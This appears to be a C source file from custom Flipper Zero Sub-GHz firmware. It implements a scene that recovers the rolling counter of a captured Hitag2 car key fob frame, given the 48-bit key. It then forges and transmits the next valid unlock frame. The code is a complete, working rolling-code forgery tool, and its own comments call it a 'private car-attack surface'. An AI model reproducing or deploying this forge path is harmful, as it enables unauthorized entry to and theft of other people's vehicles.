#include "../subghz_i.h"

#include "applications/main/subghz/helpers/subghz_txrx_i.h"
#include "../helpers/subghz_rollback.h" // subghz_rollback_hex_after (shared field parse)
#include <lib/subghz/blocks/generic.h>
#include <lib/subghz/protocols/hitag2.h> // SUBGHZ_PROTOCOL_HITAG2_NAME + (de)serialize field names
#include <lib/subghz/protocols/hitag2_cipher.h> // hitag2_recover_counter / hitag2_selftest
#include <lib/flipper_format/flipper_format.h>
#include <string.h>

// Hitag2 known-key COUNTER-RECOVERY + FORGE scene — PRIVATE only.
//
// Reached from the Rolling-Code Analyzer's Center "Forge" spoke for a captured
// Hitag2 (NXP RKE) frame. The cipher core already ships two verified primitives
// (lib/subghz/protocols/hitag2_cipher.c):
//   - hitag2_recover_counter(): from ONE frame (uid, low-10 counter, button,
//     captured 32-bit keystream) + the 48-bit key, brute-forces the 18 unknown
//     high counter bits (~2^18 cipher runs, sub-second) to recover the FULL 28-bit
//     rolling counter. A hit also proves the key + bit-order convention are right.
//   - the hitag2.c encoder FORGE path: when a .sub carries "Hitag2Key" (48b hex) +
//     "Counter" (uint32), it synthesizes the keystream a genuine fob would send for
//     that counter instead of replaying the captured Ks — i.e. valid FUTURE frames.
// Nothing in the firmware wired these together; this scene is that glue.
//
// Flow: enter the 48-bit key (byte input, MSB-first — the same on-air convention
// hitag2_rke_ks / the stored "Hitag2Key" use). On Done we re-load the selected
// capture, run hitag2_recover_counter over its fields, and — on success — serialize
// the capture, append Hitag2Key + the recovered Counter, save it to the Garage,
// load it and hand off to the Transmitter (which forges the next frame). On failure
// (wrong key / no counter matches) we route to the error scene. Read-only w.r.t. the
// original capture; the forged frame is written to a new /garage/.sub.

#ifndef PUBLIC_BUILD

#define TAG "SubGhzSceneHitag2Forge"

// Captured frame fields parsed from the decoder's get_string in on_enter and the
// user-entered 48-bit key, held across the byte-input round-trip. Single-threaded
// scene use — matches the file-static pattern in subghz_scene_rolling_analyzer.c.
static struct {
    uint32_t uid; // 32-bit identifier ("Sn:")
    uint16_t lctr; // low 10 bits of the counter ("Cnt:")
    uint8_t btn; // 4-bit button id ("Btn:")
    uint32_t ks; // full 32-bit captured keystream ("Hop:")
    bool valid; // a real Hitag2 capture was parsed
    uint8_t key[6]; // 48-bit key, MSB-first (byte-input target + "Hitag2Key" bytes)
    uint64_t key64; // key[] reassembled MSB-first, computed once before the worker runs
    FuriThread* thread; // off-UI recovery worker; NULL when idle (see on_event/on_exit)
    uint32_t counter; // recovered full 28-bit counter (worker output)
    bool recovered; // whether the worker found a matching counter (worker output)
} s_ht2_forge;

void subghz_scene_hitag2_forge_byte_input_callback(void* context) {
    SubGhz* subghz = context;
    view_dispatcher_send_custom_event(subghz->view_dispatcher, SubGhzCustomEventByteInputDone);
}

// Off-UI counter recovery. hitag2_recover_counter() brute-forces the 18 unknown
// high counter bits (~2^18 = 262144 cipher runs); running it inline in on_event
// blocked the view_dispatcher/GUI thread long enough to trip the watchdog and
// reboot. Mirroring subbrute_worker.c, the heavy loop runs on its own FuriThread
// and signals completion with a custom event; the fast file-save/hand-off stays
// on the GUI thread in the Done handler. Reads/writes only the file-static scalar
// fields (single in-flight worker, gated by the popup switch), so no lock needed.
static int32_t subghz_scene_hitag2_forge_worker(void* context) {
    SubGhz* subghz = context;
    s_ht2_forge.recovered = hitag2_recover_counter(
        s_ht2_forge.key64,
        s_ht2_forge.uid,
        s_ht2_forge.lctr,
        s_ht2_forge.btn,
        s_ht2_forge.ks,
        &s_ht2_forge.counter);
    view_dispatcher_send_custom_event(
        subghz->view_dispatcher, SubGhzCustomEventSceneHitag2ForgeDone);
    return 0;
}

void subghz_scene_hitag2_forge_on_enter(void* context) {
    SubGhz* subghz = context;

    memset(&s_ht2_forge, 0, sizeof(s_ht2_forge));

    // Re-load + deserialize the selected capture (self-contained, read-only —
    // mirrors the rolling-analyzer / analyze scenes). The Rolling-Code Analyzer
    // already stopped RX before routing here.
    bool loaded = subghz_txrx_load_decoder_by_name_protocol(
        subghz->txrx,
        subghz_history_get_protocol_name(subghz->history, subghz->idx_menu_chosen));
    FlipperFormat* fff = subghz_history_get_raw_data(subghz->history, subghz->idx_menu_chosen);
    SubGhzProtocolDecoderBase* decoder = subghz_txrx_get_decoder(subghz->txrx);
    if(loaded && fff && decoder) {
        subghz_protocol_decoder_base_deserialize(decoder, fff);
    }

    // Pull the captured fields off the decoder's authoritative get_string:
    //   "Sn:%08lX Btn:%X [..]"  /  "Cnt:%03X Hop:%08lX Chk:%02X"
    // (Hop = the full 32-bit keystream, not the truncated ks_hi in generic.data.)
    if(loaded && fff && decoder && decoder->protocol && decoder->protocol->name &&
       strcmp(decoder->protocol->name, SUBGHZ_PROTOCOL_HITAG2_NAME) == 0) {
        FuriString* text = furi_string_alloc();
        subghz_protocol_decoder_base_get_string(decoder, text);
        const char* t = furi_string_get_cstr(text);
        s_ht2_forge.uid = subghz_rollback_hex_after(t, "Sn:");
        s_ht2_forge.btn = (uint8_t)subghz_rollback_hex_after(t, "Btn:");
        s_ht2_forge.lctr = (uint16_t)(subghz_rollback_hex_after(t, "Cnt:") & 0x03FFu);
        s_ht2_forge.ks = subghz_rollback_hex_after(t, "Hop:");
        s_ht2_forge.valid = (s_ht2_forge.uid != 0);
        furi_string_free(text);
    }

    ByteInput* byte_input = subghz->byte_input;
    byte_input_set_header_text(byte_input, "Hitag2 KEY (48-bit hex)");
    byte_input_set_result_callback(
        byte_input,
        subghz_scene_hitag2_forge_byte_input_callback,
        NULL,
        subghz,
        s_ht2_forge.key,
        sizeof(s_ht2_forge.key));
    view_dispatcher_switch_to_view(subghz->view_dispatcher, SubGhzViewIdByteInput);
}

bool subghz_scene_hitag2_forge_on_event(void* context, SceneManagerEvent event) {
    SubGhz* subghz = context;
    bool consumed = false;

    if(event.type == SceneManagerEventTypeCustom &&
       event.event == SubGhzCustomEventByteInputDone) {
        consumed = true;

        if(!s_ht2_forge.valid) {
            furi_string_set(
                subghz->error_str, "No Hitag2 capture\nto forge from.");
            scene_manager_next_scene(subghz->scene_manager, SubGhzSceneShowError);
            return consumed;
        }

        // Reassemble the 48-bit on-air key MSB-first (key[0] = MS byte), matching
        // hitag2_rke_ks()/hitag2_recover_counter() and the stored "Hitag2Key" bytes.
        s_ht2_forge.key64 = 0;
        for(size_t i = 0; i < sizeof(s_ht2_forge.key); i++) {
            s_ht2_forge.key64 = (s_ht2_forge.key64 << 8) | s_ht2_forge.key[i];
        }

        // The 2^18-run counter brute-force is too heavy for the GUI thread (it
        // tripped the watchdog). Show a wait popup — which also switches away from
        // the byte input, preventing a second ByteInputDone from launching a
        // parallel worker — and run the recovery on its own thread. Completion
        // routes to SubGhzCustomEventSceneHitag2ForgeDone below.
        Popup* popup = subghz->popup;
        popup_reset(popup);
        popup_set_header(popup, "Recovering", 63, 6, AlignCenter, AlignTop);
        popup_set_text(
            popup, "Counter...\n2^18 keys", 63, 30, AlignCenter, AlignCenter);
        view_dispatcher_switch_to_view(subghz->view_dispatcher, SubGhzViewIdPopup);

        s_ht2_forge.thread = furi_thread_alloc();
        furi_thread_set_name(s_ht2_forge.thread, "Hitag2ForgeWorker");
        furi_thread_set_stack_size(s_ht2_forge.thread, 2048);
        furi_thread_set_context(s_ht2_forge.thread, subghz);
        furi_thread_set_callback(s_ht2_forge.thread, subghz_scene_hitag2_forge_worker);
        furi_thread_start(s_ht2_forge.thread);
        return consumed;
    }

    if(event.type == SceneManagerEventTypeCustom &&
       event.event == SubGhzCustomEventSceneHitag2ForgeDone) {
        consumed = true;

        // Reap the recovery worker before reading its results.
        if(s_ht2_forge.thread) {
            furi_thread_join(s_ht2_forge.thread);
            furi_thread_free(s_ht2_forge.thread);
            s_ht2_forge.thread = NULL;
        }

        if(!s_ht2_forge.recovered) {
            FURI_LOG_I(
                TAG,
                "Hitag2 forge: no counter match for UID=%08lX (wrong key?)",
                (unsigned long)s_ht2_forge.uid);
            furi_string_set(
                subghz->error_str,
                "Key rejected:\nno counter match.\nWrong key/variant?");
            scene_manager_next_scene(subghz->scene_manager, SubGhzSceneShowError);
            return consumed;
        }

        FURI_LOG_I(
            TAG,
            "Hitag2 forge: UID=%08lX counter=%07lX recovered",
            (unsigned long)s_ht2_forge.uid,
            (unsigned long)s_ht2_forge.counter);

        // Forge the NEXT frame, not the captured one: the receiver already accepted
        // counter N (this very capture), so a frame forged at N is a replay it rejects.
        // N+1 lands in the receiver's forward resync window (28-bit counter wraps).
        uint32_t forge_counter = (s_ht2_forge.counter + 1u) & 0x0FFFFFFFu;

        // Re-load the capture fresh and serialize it (Protocol/Key/Bit/Ks/Preset),
        // then append the forge fields: "Hitag2Key" (48b, key[0]=MSB) + the recovered
        // full "Counter". The hitag2 encoder deserialize rewinds for each, so field
        // order does not matter. Save to the Garage, load it, hand off to the
        // Transmitter (the encoder synthesizes the forged FUTURE frame on load).
        bool loaded = subghz_txrx_load_decoder_by_name_protocol(
            subghz->txrx,
            subghz_history_get_protocol_name(subghz->history, subghz->idx_menu_chosen));
        FlipperFormat* fff =
            subghz_history_get_raw_data(subghz->history, subghz->idx_menu_chosen);
        SubGhzProtocolDecoderBase* decoder = subghz_txrx_get_decoder(subghz->txrx);
        if(loaded && fff && decoder) {
            subghz_protocol_decoder_base_deserialize(decoder, fff);
        }
        if(!loaded || !fff || !decoder || !decoder->protocol) {
            furi_string_set(subghz->error_str, "Capture reload\nfailed.");
            scene_manager_next_scene(subghz->scene_manager, SubGhzSceneShowError);
            return consumed;
        }

        SubGhzRadioPreset* hp =
            subghz_history_get_radio_preset(subghz->history, subghz->idx_menu_chosen);
        SubGhzRadioPreset preset = hp ? *hp : subghz_txrx_get_preset(subghz->txrx);

        FlipperFormat* ff = flipper_format_string_alloc();
        bool ok =
            (subghz_protocol_decoder_base_serialize(decoder, ff, &preset) ==
             SubGhzProtocolStatusOk);
        if(ok) {
            ok = flipper_format_write_hex(
                     ff, "Hitag2Key", s_ht2_forge.key, sizeof(s_ht2_forge.key)) &&
                 flipper_format_write_uint32(ff, "Counter", &forge_counter, 1);
        }
        if(ok) {
            FuriString* path = furi_string_alloc();
            furi_string_printf(
                path,
                "%s/garage/hitag2_%08lX.sub",
                SUBGHZ_APP_FOLDER,
                (unsigned long)s_ht2_forge.uid);
            ok = subghz_save_protocol_to_file(subghz, ff, furi_string_get_cstr(path)) &&
                 subghz_key_load(subghz, furi_string_get_cstr(path), false);
            furi_string_free(path);
        }
        flipper_format_free(ff);

        if(ok) {
            scene_manager_next_scene(subghz->scene_manager, SubGhzSceneTransmitter);
        } else {
            furi_string_set(
                subghz->error_str, "Forge save failed.\nSD card / garage?");
            scene_manager_next_scene(subghz->scene_manager, SubGhzSceneShowError);
        }
    }
    return consumed;
}

void subghz_scene_hitag2_forge_on_exit(void* context) {
    SubGhz* subghz = context;
    // If the scene is left while the recovery worker is still in flight (e.g. Back
    // on the wait popup), join it before tearing down. hitag2_recover_counter has
    // no cancel hook, so this blocks for the tail of the 2^18 loop — bounded and
    // brief. The custom event it may have already queued targets no other scene.
    if(s_ht2_forge.thread) {
        furi_thread_join(s_ht2_forge.thread);
        furi_thread_free(s_ht2_forge.thread);
        s_ht2_forge.thread = NULL;
    }
    popup_reset(subghz->popup);
    byte_input_set_result_callback(subghz->byte_input, NULL, NULL, NULL, NULL, 0);
    byte_input_set_header_text(subghz->byte_input, "");
}

#endif /* !PUBLIC_BUILD — Hitag2 known-key forge, private car-attack surface only */
